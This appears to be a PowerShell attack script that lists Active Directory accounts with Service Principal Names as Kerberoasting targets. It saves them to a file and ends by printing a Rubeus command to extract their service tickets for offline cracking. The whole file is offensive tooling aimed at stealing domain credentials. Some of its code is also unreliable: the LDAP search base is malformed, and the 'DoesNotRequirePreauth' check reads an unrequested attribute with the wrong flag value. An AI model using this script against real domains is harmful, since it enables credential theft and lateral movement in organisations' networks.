#!/usr/bin/env pwsh
# Identify potential Kerberoast targets (accounts with SPNs)
# Use with Rubeus for ticket extraction

param(
    [string]$Domain = $env:USERDNSDOMAIN,
    [string]$OutputFile = "kerberoast-targets.txt"
)

Write-Host "[*] Identifying Kerberoast targets (accounts with SPNs)..."
Write-Host "[*] Domain: $Domain"

try {
    # Find all accounts with SPN set
    $targets = Get-ADObject -LDAPFilter '(servicePrincipalName=*)' -Properties servicePrincipalName -SearchBase "DC=$Domain" -ErrorAction Stop | 
        Where-Object { $_.ObjectClass -eq 'user' -or $_.ObjectClass -eq 'computer' }

    if ($targets.Count -eq 0) {
        Write-Host "[!] No accounts with SPNs found"
        exit 0
    }

    Write-Host "[*] Found $($targets.Count) potential Kerberoast targets"
    
    $results = foreach ($target in $targets) {
        $spns = $target.servicePrincipalName -join ","
        [PSCustomObject]@{
            Name = $target.Name
            DistinguishedName = $target.DistinguishedName
            ObjectClass = $target.ObjectClass
            SPNs = $spns
            DoesNotRequirePreauth = $target."msDS-User-Account-Control-Computed" -band 0x40
        }
    }

    # Save to file
    $results | Export-Csv -Path $OutputFile -NoTypeInformation
    Write-Host "[*] Results saved to: $OutputFile"
    
    # Display summary
    $results | Format-Table -AutoSize -Wrap

    Write-Host ""
    Write-Host "[+] To extract tickets, use Rubeus:"
    Write-Host "    Rubeus.exe kerberoast /user:<username> /aes /nowrap /outfile:tgs.txt"

} catch {
    Write-Host "[!] Error: $_"
    exit 1
}
